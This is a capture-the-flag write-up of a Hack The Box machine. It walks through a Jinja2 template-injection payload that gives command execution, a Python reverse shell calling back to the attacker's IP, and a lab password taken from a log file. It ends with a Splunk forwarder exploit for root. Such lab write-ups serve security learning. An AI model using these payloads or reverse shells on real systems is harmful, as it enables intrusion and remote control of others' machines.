# Box 



![image-20201230035515067](img/image-20201230035515067.png)

https://www.hackthebox.eu/home/machines/profile/278

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Reconnaissance](#Reconnaissance)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User](#user)
  + [Root](#root)

# Contents 

## Reconnaissance



Let's start with nmap :

```bash
nmap -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.209 10.10.10.209
```

![image-20201230035855312](img/image-20201230035855312.png)

We go on the first webpage, but nothing interesting is found using gobuster.

Let's try to get on the webpage of splunk. 

![image-20201230042152630](img/image-20201230042152630.png)

we can see here a domain name dev.splunk.com, let's add it to our /etc/hosts

We now have a new page where we can register then login :

![image-20201230073548111](img/image-20201230073548111.png)

Now that we are connected we can post messages : 

![image-20201230073625066](img/image-20201230073625066.png)

Let's see if we can do some XSS :

![image-20201230080923967](img/image-20201230080923967.png)

We can see that the server runs Werkzeug which is a tool to do templates. Let's try to find the right template.

After testing {{ 7 * 7}} and getting the result 49, we can conclude that the template is jinja2. We can now try to find subprocess.Popen to get a RCE (https://akshukatkar.medium.com/rce-with-flask-jinja-template-injection-ea5d0201b870)

## Exploitation

```bash
{{[].__class__.__base__.__subclasses__()[407]}}
```

this command gives us the subprocess.popen class

![image-20201230100110528](img/image-20201230100110528.png)

Now I can execute any command with this payload : 

```bash
{{[].__class__.__base__.__subclasses__().pop(407)(['ls'],shell=True,stdout=-1).communicate()}}
```

![image-20201230101355751](img/image-20201230101355751.png)

Now let's get all the binaries from the /bin folder. I see that there is python on the remote machine. 

![image-20201230101932787](img/image-20201230101932787.png)

Let's get our reverse_shell with a python payload : 

```python
{{[].__class__.__base__.__subclasses__().pop(407)(['python2.7 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''],shell=True,stdout=-1).communicate()}}
```

![image-20201230102022216](img/image-20201230102022216.png)

We are in !

## Post-Exploitation

### User

We can see that we are in the group adm. So we can read logs.

![image-20201230103815204](img/image-20201230103815204.png)

After a while, I found a credential in the bakcup file in the /var/logs/apache2 folder.

![image-20201230144552303](img/image-20201230144552303.png)

So now we can su to shaun and get our flag :

![image-20201230144717225](img/image-20201230144717225.png)

### Root

Root was actually the easiest part because I already found the exploit during my first reconnaissance. We can see the exploit here : 

https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/

We are gonna use this script : https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py

I put in a script called give_root_.sh the same payload for the reverse_shell that i used before : 

```bash
python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Then I ran our exploit : 

```bash
python3.8 exploit.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.28  --username shaun --password Guitar123 --payload "/home/shaun/give_root_.sh" 

```

![image-20201230151256511](img/image-20201230151256511.png)

Rooted.